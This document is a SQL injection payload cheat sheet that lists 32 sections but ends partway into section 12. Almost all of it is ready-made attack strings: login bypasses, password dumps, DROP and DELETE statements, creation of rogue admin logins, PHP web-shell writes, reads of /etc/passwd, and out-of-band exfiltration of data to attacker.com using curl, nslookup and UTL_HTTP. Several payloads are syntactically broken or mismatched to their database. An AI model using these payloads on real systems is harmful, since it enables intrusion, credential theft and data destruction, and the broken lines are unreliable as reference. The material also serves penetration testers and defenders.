# SQL INJECTION PAYLOAD INDEX

[1] AUTHENTICATION BYPASS
[2] COLUMN COUNT DETECTION
[3] UNION-BASED SQLi
[4] DATABASE ENUMERATION
[5] COLUMN ENUMERATION
[6] DATA EXTRACTION
[7] BOOLEAN-BASED BLIND
[8] TIME-BASED BLIND
[9] ERROR-BASED SQLi
[10] FILE READ/WRITE
[11] OOB / DNS EXFILTRATION
[12] ENCODING & OBFUSCATION
[13] WHITESPACE & SYNTAX BYPASS
[14] KEYWORD FILTER BYPASS
[15] ADVANCED CHAINED PAYLOADS
[16] MEMORY & PERFORMANCE ATTACKS
[17] SECOND-ORDER SQLi
[18] NO-SQL INJECTION
[19] NOSQL (Cassandra/CouchDB)
[20] DATABASE FINGERPRINTING
[21] WAF DETECTION & EVASION
[22] RACE CONDITION & TIMING
[23] STORED PROCEDURE INJECTION
[24] METADATA QUERIES
[25] DATABASE LINK & FEDERATED
[26] CRYPTOGRAPHIC ATTACKS
[27] PRIVILEGE ESCALATION
[28] PERSISTENCE TECHNIQUES
[29] LEGACY DATABASE PAYLOADS
[30] EMERGING TECHNIQUES (2024-2025)
[31] PHYSICAL DATABASE ATTACKS
[32] BLIND EXTRACTION SCRIPTS

<!--
[1] AUTHENTICATION BYPASS - MEGA LIST
-->

-- Mathematical bypasses
' OR 1=1--
' OR 1=1 LIMIT 1--
' OR 1=1 OFFSET 0--
' OR 1=1 AND 1=1--
' OR 1=1 OR 1=1--
' OR 1=1 XOR 0=0--
' OR 1\*1=1--
' OR 1/1=1--
' OR 1%1=0--
' OR 1^0=1--
' OR 1&1=1--
' OR 1|0=1--
' OR ~1=-2--
' OR 1<<0=1--
' OR 1>>0=1--

-- String logic bypasses
' OR 'a'='a'--
' OR 'a'!='b'--
' OR 'ab' LIKE 'a%'--
' OR 'abc' LIKE '%b%'--
' OR 'abc' LIKE '%c'--
' OR 'a' IN ('a','b')--
' OR 'a' BETWEEN 'a' AND 'b'--
' OR LOWER('A')='a'--
' OR UPPER('a')='A'--
' OR 'a' = CHAR(97)--
' OR 'a' = ASCII(97)--
' OR CONCAT('a','b')='ab'--
' OR REVERSE('a')='a'--
' OR REPEAT('a',1)='a'--
' OR LEFT('abc',1)='a'--
' OR RIGHT('abc',1)='c'--
' OR MID('abc',1,1)='a'--
' OR SUBSTR('abc',1,1)='a'--
' OR SUBSTRING('abc',1,1)='a'--

-- NULL-based bypasses
' OR NULL IS NULL--
' OR NULL = NULL--
' OR NULL != NULL--
' OR NULL IS NOT NULL--
' OR COALESCE(NULL,1)=1--
' OR IFNULL(NULL,1)=1--
' OR ISNULL(NULL)=1--
' OR 1 IS NOT NULL--
' OR '' IS NULL--
' OR 0 IS NOT NULL--

-- Type conversion bypasses
' OR '1' = 1--
' OR '1' = 1.0--
' OR '1' = 1e0--
' OR '1' = 0x31--
' OR '1' = b'1'--
' OR '1' = TRUE--
' OR '1' = '1'::int--

-- Comparison operator bypasses
' OR 1 <> 2--
' OR 1 > 0--
' OR 1 < 2--
' OR 1 >= 1--
' OR 1 <= 1--
' OR NOT (1=2)--
' OR 1 BETWEEN 0 AND 2--
' OR 1 IN (0,1,2)--
' OR EXISTS(SELECT 1)--
' OR NOT EXISTS(SELECT 0)--

-- Logical operator combinations
' OR (1=1) AND (2=2)--
' OR (1=1) OR (1=2)--
' OR (1=1) XOR (1=2)--
' OR (1=1) && (2=2)--
' OR (1=1) || (1=2)--
' OR 1=1 AND 2=2 AND 3=3--
' OR (1=1) OR (1=1) AND (1=2)--

-- Comment-based bypasses
'-- -
'#
'/\*_/
';-- -
'/_
'#\n
'-- \n
'/_!_/--
'#%0a
'--%0a

-- Multi-statement bypasses
'; SELECT \* FROM users--
'; INSERT INTO users VALUES('hack','me')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; DELETE FROM users WHERE 1=1--
'; DROP TABLE users--
'; TRUNCATE TABLE users--
'; CREATE TABLE backdoor(id INT)--
'; ALTER TABLE users ADD COLUMN backdoor TEXT--

-- Stacked query bypasses (if supported)
' ; EXEC xp_cmdshell('whoami')--
' ; EXEC sp_addlogin 'hacker','pass'--
' ; EXEC sp_addsrvrolemember 'hacker','sysadmin'--

-- Error-based authentication bypass
' OR 1=1 AND 1/0--
' OR 1=1 AND 1=CONVERT(int,'a')--
' OR 1=1 AND EXTRACTVALUE(1,1)--

-- Time-based authentication bypass
' OR 1=1 AND SLEEP(5)--
' OR 1=1 AND BENCHMARK(1000000,MD5(1))--
' OR 1=1 AND pg_sleep(5)--
' OR 1=1 AND WAITFOR DELAY '0:0:5'--

-- Wildcard bypasses
' OR username LIKE '%'--
' OR username LIKE 'a%'--
' OR username LIKE '%min'--
' OR username LIKE '\_dmin'--
' OR username LIKE 'a_min'--

-- Regex bypasses
' OR username RLIKE '^._$'--
' OR username REGEXP '^a._'--
' OR username REGEXP '._min$'--
' OR username ~ '^._$'-- (PostgreSQL)

-- Unicode normalization bypass
' OR 1=1-- (U+FF07 instead of single quote)
' OR 1=1-- (U+2018 instead of single quote)
' OR 1=1-- (U+2019 instead of single quote)

<!--
[2] COLUMN COUNT DETECTION - EXTREME LIST
-->

-- Order by variations
ORDER BY 1,2,3,4,5,6,7,8,9,10--
ORDER BY 1 DESC--
ORDER BY 1 ASC--
ORDER BY (SELECT 1)--
ORDER BY @@version--
ORDER BY database()--
ORDER BY user()--
ORDER BY (SELECT COUNT(\*))--

-- Group by detection
GROUP BY 1,2,3,4,5--
GROUP BY 1 HAVING 1=1--
GROUP BY 1 HAVING MIN(1)=1--
GROUP BY 1 WITH ROLLUP--

-- Union-based detection with errors
' UNION SELECT @,1,2--
' UNION SELECT @a:=1,2,3--
' UNION SELECT @\g1,2,3--
' UNION SELECT \* FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--

-- Procedure-based detection
' ORDER BY (SELECT _ FROM (SELECT 1 UNION SELECT 2)a)--
' ORDER BY (SELECT COUNT(_) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)a)--

-- XML-based detection
' ORDER BY (SELECT 1 FOR XML PATH(''))--

-- JSON-based detection
' ORDER BY (SELECT 1 FOR JSON PATH)--

-- Binary search for column count
' ORDER BY 10-- (if error, try 5, then 7, etc.)
' HAVING 1=1-- (if error, column count in error message)

-- Exhaustive detection
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--

-- Automated column detection using errors
' AND 1=(SELECT COUNT(_) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' AND ORDINAL_POSITION=1)--
' AND 1=(SELECT COUNT(_) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' AND ORDINAL_POSITION=2)--

<!--
[3] UNION-BASED SQLi - EXTREME VARIATIONS
-->

-- Advanced union structures
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--
' UNION ALL SELECT 1,2,3--
' UNION DISTINCT SELECT 1,2,3--
' UNION SELECT 1,2,3 FROM DUAL--
' UNION SELECT 1,2,3 FROM (SELECT 1)a--

-- Nested unions
' UNION SELECT 1,2,3 UNION SELECT 4,5,6 UNION SELECT 7,8,9--
' UNION SELECT \* FROM (SELECT 1 UNION SELECT 2)a--

-- Union with subqueries
' UNION SELECT (SELECT database()),2,3--
' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),2,3--
' UNION SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),2,3--

-- Union with joins
' UNION SELECT u.username, p.password FROM users u JOIN passwords p ON u.id=p.user_id--
' UNION SELECT a.data, b.data FROM table1 a CROSS JOIN table2 b--

-- Union with conditions
' UNION SELECT username,password FROM users WHERE '1'='1--
' UNION SELECT username,password FROM users WHERE 1=1--
' UNION SELECT username,password FROM users WHERE 2>1--

-- Union with limits
' UNION SELECT username,password FROM users LIMIT 1--
' UNION SELECT username,password FROM users LIMIT 1 OFFSET 0--
' UNION SELECT username,password FROM users LIMIT 0,1--

-- Union with order by
' UNION SELECT username,password FROM users ORDER BY 1--
' UNION SELECT username,password FROM users ORDER BY username DESC--

-- Union with hex encoding
' UNION SELECT 0x75736572,0x70617373--
' UNION SELECT UNHEX('75736572'),UNHEX('70617373')--

-- Union with char encoding
' UNION SELECT CHAR(117,115,101,114),CHAR(112,97,115,115)--

-- Union with concat
' UNION SELECT CONCAT(username,':',password),2 FROM users--
' UNION SELECT CONCAT_WS('|',username,password,email),2 FROM users--
' UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '|'),2 FROM users--

-- Union with string aggregation (different DBs)
-- MySQL: GROUP_CONCAT
-- PostgreSQL: STRING_AGG
-- MSSQL: STRING_AGG or STUFF + FOR XML PATH
-- Oracle: LISTAGG

-- Union with JSON output
' UNION SELECT JSON_OBJECT('username',username,'password',password),2 FROM users-- (MySQL 5.7+)
' UNION SELECT JSON_ARRAYAGG(JSON_OBJECT('user',username)),2 FROM users-- (MySQL 5.7+)

-- Union with XML output
' UNION SELECT (SELECT username FROM users FOR XML PATH('')),2--
' UNION SELECT (SELECT username FROM users FOR XML RAW),2--

-- Union with file output
' UNION SELECT username,password FROM users INTO OUTFILE '/tmp/users.txt'--

<!--
[4] DATABASE ENUMERATION - COMPLETE LIST
-->

-- MySQL complete enumeration
-- Version
SELECT @@version, @@version*comment, @@version_compile_os, @@version_compile_machine
SELECT VERSION(), SESSION_USER(), SYSTEM_USER(), CURRENT_USER()
SELECT @@GLOBAL.version, @@SESSION.version
SELECT /*!50000VERSION\_/()
SELECT 5.7.42-log

-- Database names
SELECT schema_name FROM information_schema.schemata
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1 OFFSET 0
SELECT DISTINCT table_schema FROM information_schema.tables
SELECT database()
SELECT DATABASE(), SCHEMA()

-- Current user
SELECT user(), current_user(), session_user(), system_user()
SELECT USER(), CURRENT_USER()
SELECT SUBSTRING_INDEX(USER(),'@',1)
SELECT SUBSTRING_INDEX(USER(),'@',-1)

-- All users
SELECT user, host, password FROM mysql.user
SELECT user, host, authentication_string FROM mysql.user WHERE authentication_string!=''
SELECT grantee, privilege_type FROM information_schema.user_privileges

-- Privileges
SELECT _ FROM information_schema.user_privileges
SELECT _ FROM information_schema.schema_privileges
SELECT \* FROM information_schema.table_privileges
SHOW GRANTS FOR CURRENT_USER()
SHOW GRANTS

-- Variables
SELECT @@datadir, @@basedir, @@hostname, @@port, @@socket
SELECT @@tmpdir, @@secure_file_priv, @@log_error, @@pid_file
SELECT @@max_allowed_packet, @@wait_timeout, @@interactive_timeout
SELECT @@character_set_database, @@collation_database
SELECT @@sql_mode, @@auto_increment_increment

-- PostgreSQL complete enumeration
-- Version
SELECT version()
SELECT current_setting('server_version')
SELECT current_setting('server_version_num')
SELECT VERSION(), current_database(), current_user, session_user

-- Database names
SELECT datname FROM pg_database
SELECT datname FROM pg_database WHERE datistemplate=false
SELECT current_database()

-- Tablespaces
SELECT spcname FROM pg_tablespace

-- Schemas
SELECT schema_name FROM information_schema.schemata
SELECT nspname FROM pg_namespace

-- Current user
SELECT current_user, session_user, user
SELECT usename FROM pg_user
SELECT rolname FROM pg_roles

-- All users
SELECT usename, usesysid, usecreatedb, usesuper, passwd FROM pg_shadow
SELECT rolname, rolsuper, rolinherit, rolcreaterole, rolcreatedb, rolcanlogin FROM pg_roles

-- Privileges
SELECT grantee, privilege_type FROM information_schema.role_column_grants
SELECT \* FROM pg_authid

-- Settings
SHOW ALL;
SELECT name, setting, unit, category FROM pg_settings
SELECT current_setting('data_directory')
SELECT current_setting('config_file')

-- MSSQL complete enumeration
-- Version
SELECT @@VERSION
SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel'), SERVERPROPERTY('edition')
SELECT @@VERSION, @@SERVERNAME, @@SERVICENAME

-- Database names
SELECT name FROM master..sysdatabases
SELECT database_id, name FROM sys.databases
SELECT DB_NAME()
SELECT DB_NAME(1), DB_NAME(2), DB_NAME(3)

-- Current user
SELECT SYSTEM_USER, USER, CURRENT_USER, SUSER_NAME(), SUSER_SNAME()
SELECT ORIGINAL_LOGIN()

-- All users
SELECT name, principal_id, type, type_desc FROM sys.server_principals
SELECT name, loginname, dbname, useself, permission FROM syslogins
SELECT \* FROM sys.sql_logins

-- Privileges
SELECT _ FROM sys.fn_my_permissions(NULL, 'SERVER')
SELECT _ FROM sys.fn_my_permissions('master', 'DATABASE')
SELECT \* FROM sys.fn_my_permissions('sys.objects', 'OBJECT')

-- Server properties
SELECT SERVERPROPERTY('MachineName'), SERVERPROPERTY('InstanceName')
SELECT SERVERPROPERTY('IsClustered'), SERVERPROPERTY('IsHadrEnabled')
SELECT SERVERPROPERTY('ComputerNamePhysicalNetBIOS')

-- Extended properties
SELECT \* FROM sys.extended_properties

-- Oracle complete enumeration
-- Version
SELECT \* FROM v$version
SELECT banner FROM v$version WHERE rownum=1
SELECT version FROM product_component_version WHERE rownum=1

-- Database names
SELECT name, dbid, created, log_mode FROM v$database
SELECT global_name FROM global_name
SELECT SYS.DATABASE_NAME FROM DUAL
SELECT owner FROM all_tables WHERE ROWNUM=1

-- Current user
SELECT USER FROM DUAL
SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM DUAL
SELECT UID FROM DUAL

-- All users
SELECT username, user_id, account_status, default_tablespace FROM dba_users
SELECT username, user_id, created, profile FROM all_users
SELECT grantee, granted_role FROM dba_role_privs

-- Privileges
SELECT _ FROM session_privs
SELECT _ FROM dba_sys_privs WHERE grantee='PUBLIC'
SELECT \* FROM dba_tab_privs WHERE grantee='PUBLIC'

-- Database links
SELECT \* FROM all_db_links
SELECT owner, db_link, username, host FROM dba_db_links

<!--
[5] COLUMN ENUMERATION - COMPREHENSIVE
-->

-- MySQL column enumeration
SELECT column_name, data_type, is_nullable, column_type, column_key FROM information_schema.columns WHERE table_name='users'
SELECT column_name, ordinal_position, data_type, character_maximum_length FROM information_schema.columns WHERE table_name='users' AND table_schema=database()

-- Column existence check
' AND (SELECT COUNT(\*) FROM information_schema.columns WHERE table_name='users' AND column_name='password')=1--
' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)='id'--

-- Column name brute force with substring
AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1)) > 64
AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),2,1)) > 64

-- Column count per table
' AND (SELECT COUNT(\*) FROM information_schema.columns WHERE table_name='users')=5--

-- Column data type extraction
' UNION SELECT column_name, data_type, 3 FROM information_schema.columns WHERE table_name='users'--

-- PostgreSQL column enumeration
SELECT column_name, data_type, is_nullable, character_maximum_length FROM information_schema.columns WHERE table_name='users'
SELECT attname, atttypid::regtype, attnotnull FROM pg_attribute WHERE attrelid='users'::regclass AND attnum>0

-- MSSQL column enumeration
SELECT column_name, data_type, is_nullable FROM information_schema.columns WHERE table_name='users'
SELECT name, system_type_name, max_length, is_nullable FROM sys.dm_exec_describe_first_result_set('SELECT \* FROM users', NULL, 0)

-- Oracle column enumeration
SELECT column_name, data_type, nullable, data_length FROM all_tab_columns WHERE table_name='USERS'
SELECT column_name, data_type, nullable FROM user_tab_columns WHERE table_name='USERS'

<!--
[6] DATA EXTRACTION - MEGA TECHNIQUES
-->

-- Row-by-row extraction
' UNION SELECT username, password FROM users LIMIT 0,1--
' UNION SELECT username, password FROM users LIMIT 1,1--
' UNION SELECT username, password FROM users LIMIT 2,1--

-- Conditional extraction
' UNION SELECT CASE WHEN user_id=1 THEN username ELSE NULL END, CASE WHEN user_id=1 THEN password ELSE NULL END FROM users--
' UNION SELECT IF(user_id=1,username,NULL), IF(user_id=1,password,NULL) FROM users--
' UNION SELECT DECODE(user_id,1,username), DECODE(user_id,1,password) FROM users-- (Oracle)

-- Hexadecimal extraction
' UNION SELECT HEX(username), HEX(password) FROM users--
' UNION SELECT CONCAT('0x',HEX(username)), CONCAT('0x',HEX(password)) FROM users--

-- Binary extraction
' UNION SELECT BINARY(username), BINARY(password) FROM users--

-- Encoded extraction
' UNION SELECT TO_BASE64(username), TO_BASE64(password) FROM users-- (MySQL)
' UNION SELECT ENCODE(username,'key'), ENCODE(password,'key') FROM users--

-- Compressed extraction
' UNION SELECT COMPRESS(username), COMPRESS(password) FROM users-- (MySQL)

-- Reverse string extraction
' UNION SELECT REVERSE(username), REVERSE(password) FROM users--

-- Length-based extraction
' UNION SELECT LENGTH(username), LENGTH(password) FROM users--

-- Hash extraction
' UNION SELECT MD5(username), SHA1(password) FROM users--

-- Multiple column concatenation
' UNION SELECT CONCAT(id, '|', username, '|', password, '|', email), 2 FROM users--
' UNION SELECT id || '|' || username || '|' || password, 2 FROM users-- (PostgreSQL)

-- JSON data extraction
' UNION SELECT JSON_OBJECT('id',id,'username',username,'password',password),2 FROM users-- (MySQL)
' UNION SELECT ROW_TO_JSON(users) FROM users-- (PostgreSQL)
' UNION SELECT (SELECT username FROM users FOR JSON AUTO)-- (MSSQL)

-- XML data extraction
' UNION SELECT (SELECT username FROM users FOR XML PATH('user')),2--
' UNION SELECT (SELECT username, password FROM users FOR XML RAW),2--

-- Cursor-based extraction (MSSQL)
DECLARE @c CURSOR; SET @c = CURSOR FOR SELECT username FROM users; OPEN @c; FETCH NEXT FROM @c; CLOSE @c; DEALLOCATE @c;

-- Table dumping (all data at once)
' UNION SELECT GROUP_CONCAT(CONCAT_WS('|',id,username,password) SEPARATOR '\n'),2 FROM users--
' UNION SELECT STRING_AGG(CONCAT(id,',',username,',',password), CHAR(10)),2 FROM users-- (PostgreSQL)

-- Subquery extraction (nested)
' UNION SELECT (SELECT GROUP_CONCAT(username) FROM users WHERE user_id=1),2--
' UNION SELECT (SELECT GROUP_CONCAT(password) FROM users WHERE user_id=1),2--

-- Join extraction across tables
' UNION SELECT u.username, p.password FROM users u JOIN passwords p ON u.id=p.user_id--
' UNION SELECT u.username, e.email FROM users u JOIN emails e ON u.id=e.user_id--

<!--
[7] BOOLEAN-BASED BLIND - ADVANCED MATHEMATICAL
-->

-- Mathematical blind
AND 1+1=2--
AND 2\*3=6--
AND 10/2=5--
AND 10-5=5--
AND 10%3=1--
AND 2^3=1--
AND 2&3=2--
AND 2|3=3--
AND ~2=-3--
AND 2<<1=4--
AND 2>>1=1--

-- String function blind
AND LENGTH(database())=8--
AND LENGTH(database())>5--
AND LENGTH(database())<10--
AND CHAR_LENGTH(database())=8--
AND BIT_LENGTH(database())=64--

-- Substring blind
AND SUBSTRING(database(),1,1)='m'--
AND SUBSTR(database(),1,1)='m'--
AND MID(database(),1,1)='m'--
AND LEFT(database(),1)='m'--
AND RIGHT(database(),1)='b'--
AND REVERSE(database()) LIKE 'b%'--

-- Positional blind
AND POSITION('y' IN database())>0--
AND LOCATE('y', database())>0--
AND INSTR(database(), 'y')>0--
AND database() LIKE '%y%'--
AND database() REGEXP '._y._'--

-- Regular expression blind
AND database() REGEXP '^[a-z]'--
AND database() REGEXP '^m.*'--
AND database() REGEXP '.*b$'--
AND database() REGEXP '^.{5}$'--
AND database() REGEXP '^[a-z]{5}$'--

-- Comparison blind
AND database() > 'm'--
AND database() < 'z'--
AND database() BETWEEN 'a' AND 'm'--
AND database() IN ('mysql','test')--

-- Hash comparison blind
AND MD5(database())='81dc9bdb52d04dc20036dbd8313ed055'--
AND SHA1(database())='c6f057b86584942e415435ffb1fa93d4bb5a93e5'--

-- Bit manipulation blind
AND (ASCII(database()) & 1)=1-- (check if odd)
AND (ASCII(database()) & 2)=2-- (check 2nd bit)
AND (ASCII(database()) >> 1)=64-- (right shift)

<!--
[8] TIME-BASED BLIND - EXTREME TECHNIQUES
-->

-- MySQL heavy time-based
AND SLEEP(5)--
AND BENCHMARK(10000000,MD5(1))--
AND RLIKE SLEEP(5)--
AND (SELECT SLEEP(5))--
AND (SELECT COUNT(\*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C WHERE SLEEP(5))--

-- MySQL conditional time
AND IF(1=1, SLEEP(5), 0)--
AND IF(1=2, 0, SLEEP(5))--
AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--
AND IFNULL(SLEEP(5),0)--
AND COALESCE(SLEEP(5),0)--

-- MySQL union time
' UNION SELECT SLEEP(5)--
' UNION SELECT IF(1=1, BENCHMARK(10000000,MD5(1)), 0)--

-- PostgreSQL heavy time
AND pg_sleep(5)--
AND (SELECT pg_sleep(5))--
AND (SELECT COUNT(\*) FROM generate_series(1,10000000) WHERE pg_sleep(0) IS NULL)--
AND (SELECT set_config('statement_timeout', '5s', false))--

-- PostgreSQL conditional time
AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- MSSQL heavy time
AND WAITFOR DELAY '0:0:5'--
AND WAITFOR TIME '00:00:05'--
AND (SELECT COUNT(\*) FROM sys.objects WHERE WAITFOR DELAY '0:0:5')>0--

-- MSSQL conditional time
AND IF(1=1, WAITFOR DELAY '0:0:5', 0)--
AND CASE WHEN 1=1 THEN WAITFOR DELAY '0:0:5' ELSE 0 END--

-- Oracle heavy time
AND DBMS_LOCK.SLEEP(5)--
AND UTL_INADDR.get_host_address('127.0.0.1') AND 1=DBMS_LOCK.SLEEP(5)--
AND (SELECT COUNT(\*) FROM all_users WHERE DBMS_LOCK.SLEEP(5)=0)>0--

-- Oracle conditional time
AND CASE WHEN 1=1 THEN DBMS_LOCK.SLEEP(5) ELSE 0 END--

<!--
[9] ERROR-BASED SQLi - COMPLETE COLLECTION
-->

-- MySQL double query error
AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- MySQL ExtractValue error
AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--
AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 0x7e))--

-- MySQL UpdateXML error
AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)--
AND UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username) FROM users), 0x7e), 1)--

-- MySQL GeometryCollection error
AND geometrycollection((select _ from(select _ from(select database())a)b))--
AND multipoint((select _ from(select _ from(select database())a)b))--
AND polygon((select _ from(select _ from(select database())a)b))--
AND multilinestring((select _ from(select _ from(select database())a)b))--

-- MySQL JSON error (5.7+)
AND JSON_EXTRACT('{"a":1}', CONCAT('$.',(SELECT database())))--

-- MySQL name_const error
AND name_const((SELECT database()),1)--

-- PostgreSQL error-based
AND 1=CAST((SELECT database()) AS int)--
AND 1::int = (SELECT database())--
AND (SELECT database())::int > 0--
AND 1/CAST((SELECT database()) AS int)--
AND (SELECT COUNT(\*) FROM (SELECT database() AS a) b WHERE a::int=1)--

-- PostgreSQL XML error
AND query_to_xml('SELECT database()',true,true,'')::text::int=1--

-- MSSQL error-based
AND 1=CONVERT(int,(SELECT database()))--
AND 1=CONVERT(int,@@VERSION)--
AND 1/0--
AND 1=(SELECT @@VERSION)--
AND 1=(SELECT name FROM sysobjects)--
AND 'a'=CONVERT(int,'a')--

-- MSSQL XML error
AND 1=(SELECT CONVERT(int,(SELECT database() FOR XML PATH(''))))--

-- Oracle error-based
AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--
AND 1=XMLTYPE('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/'||(SELECT database())||'">%remote;]>') IS NOT NULL--

<!--
[10] FILE READ/WRITE - ADVANCED TECHNIQUES
-->

-- MySQL file read with encoding
SELECT LOAD_FILE('/etc/passwd')
SELECT LOAD_FILE(CHAR(47,101,116,99,47,112,97,115,115,119,100))
SELECT LOAD_FILE(0x2F6574632F706173737764)
SELECT LOAD_FILE(UNHEX('2F6574632F706173737764'))

-- MySQL file read with conditions
SELECT IF(LOAD_FILE('/etc/passwd') IS NOT NULL, 'exists', 'not exists')
SELECT CASE WHEN LOAD_FILE('/etc/passwd') LIKE '%root%' THEN 'found' ELSE 'not found' END

-- MySQL file write (basic)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
SELECT '<?php eval($_POST["c"]); ?>' INTO DUMPFILE '/var/www/html/shell.php'

-- MySQL file write (encoded)
SELECT UNHEX('3C3F7068702073797374656D28245F4745545B22636D64225D293B203F3E') INTO DUMPFILE '/var/www/html/shell.php'
SELECT CONVERT('<?php system($_GET["cmd"]); ?>' USING latin1) INTO OUTFILE '/var/www/html/shell.php'

-- MySQL file write (with lines terminated by)
SELECT username,password FROM users INTO OUTFILE '/tmp/users.csv' FIELDS TERMINATED BY ',' LINES TERMINATED BY '\n'

-- MySQL file write (dump from query)
SELECT \* FROM information_schema.tables INTO OUTFILE '/tmp/dump.sql'

-- PostgreSQL file read
SELECT pg_read_file('/etc/passwd')
SELECT pg_read_file('postgresql.conf', 0, 1000)
SELECT convert_from(pg_read_binary_file('/etc/passwd'), 'UTF8')

-- PostgreSQL file write
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'
COPY users(username,password) TO '/tmp/users.csv' CSV HEADER

-- PostgreSQL large object
SELECT lo_import('/etc/passwd')
SELECT lo_get(lo_import('/etc/passwd'))
SELECT lo_export(lo_import('/etc/passwd'), '/tmp/passwd_copy')

-- MSSQL file read
SELECT \* FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS contents
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_BLOB) AS x
EXEC xp_cmdshell 'type C:\Windows\win.ini'

-- MSSQL file write (requires OLE automation)
DECLARE @obj INT, @fso INT; EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUTPUT; EXEC sp_OAMethod @fso, 'CreateTextFile', @obj OUTPUT, 'C:\temp\test.txt'; EXEC sp_OAMethod @obj, 'Write', NULL, 'data'; EXEC sp_OADestroy @obj; EXEC sp_OADestroy @fso

-- Oracle file read
SELECT UTL_FILE.FOPEN('/etc', 'passwd', 'R') FROM DUAL
SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('/etc', 'passwd', 'R'), 1) FROM DUAL

<!--
[11] OOB / DNS EXFILTRATION - ADVANCED
-->

-- MySQL OOB with UNC path
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'))
SELECT LOAD_FILE(CONCAT('//',(SELECT database()),'.attacker.com/a'))
SELECT INTO OUTFILE '\\\\attacker.com\\share\\out.txt' FIELDS TERMINATED BY (SELECT database())

-- MySQL OOB with subquery
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables),'.attacker.com\\a'))

-- PostgreSQL OOB
COPY (SELECT database()) TO PROGRAM 'nslookup attacker.com'
COPY (SELECT database()) TO PROGRAM 'curl http://attacker.com/'||(SELECT database())
SELECT pg_notify('channel', (SELECT database()))

-- PostgreSQL OOB with dblink
SELECT \* FROM dblink('host=attacker.com user='||(SELECT database())||' dbname=test', 'SELECT 1') AS t(a int)

-- MSSQL OOB with xp_dirtree
DECLARE @h varchar(8000); SELECT @h = (SELECT database() FOR XML PATH('')); EXEC master..xp_dirtree '//attacker.com/'+@h+'/a'
EXEC xp_fileexist '//attacker.com/'+(SELECT database())+'/test.txt'

-- MSSQL OOB with xp_subdirs
EXEC xp_subdirs '//attacker.com/'+(SELECT database())

-- MSSQL OOB with sp_addlinkedserver
EXEC sp_addlinkedserver 'linked', '', 'SQLOLEDB', 'attacker.com'

-- Oracle OOB with UTL_HTTP
SELECT UTL_HTTP.request('http://attacker.com/'||(SELECT database() FROM DUAL)) FROM DUAL
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1)) FROM DUAL

-- Oracle OOB with UTL_INADDR
SELECT UTL_INADDR.get_host_address((SELECT database() FROM DUAL)||'.attacker.com') FROM DUAL

<!--
[12] ENCODING & OBFUSCATION - ULTIMATE LIST
-->

-- Hexadecimal encoding
0x27204f5220313d312d2d
0x276f7220313d312d2d
0x27554e494f4e2053454c45435420312c322d2d

-- Unicode encoding variants
%u0027%u0020%u004f%u0052%u0020%u0031%u003d%u0031%u002d%u002d
%u0027%20%u004F%52%20%u0031%3d%u0031--
%ef%bc%87%20%ef%bc%af%ef%bc%b2%20%ef%bc%91%ef%bc%9d%ef%bc%91%ef%bc%8d%ef%bc%8d

-- Double URL encoding
%2527%2520%254f%2552%2520%2531%253d%2531%252d%252d
%2527%2520%254F%2552%2520%2531%253D%2531%252D%252D

-- Triple URL encoding
%252527%252520%25254F%252552%252520%252531%25253D%252531%25252D%25252D

-- UTF-8 overlong encoding
%c0%a7%20%c0%af%c0%b2%20%c0%b1%c0%bd%c0%b1%c0%ad%c0%ad

-- HTML entity encoding
&#39; OR 1=1--
&#x27; OR 1=1--
&apos; OR 1=1--
&#39; &#x4f;&#x52; 1=1--

-- HTML decimal with leading zeros
&#00039; OR 1=1--
&#000000039; OR 1=1--

-- Mixed encoding
'%20OR%201=1--
%27%20%4f%52%20%31%3d%31--

-- Case variation
uNiOn sElEcT 1,2,3
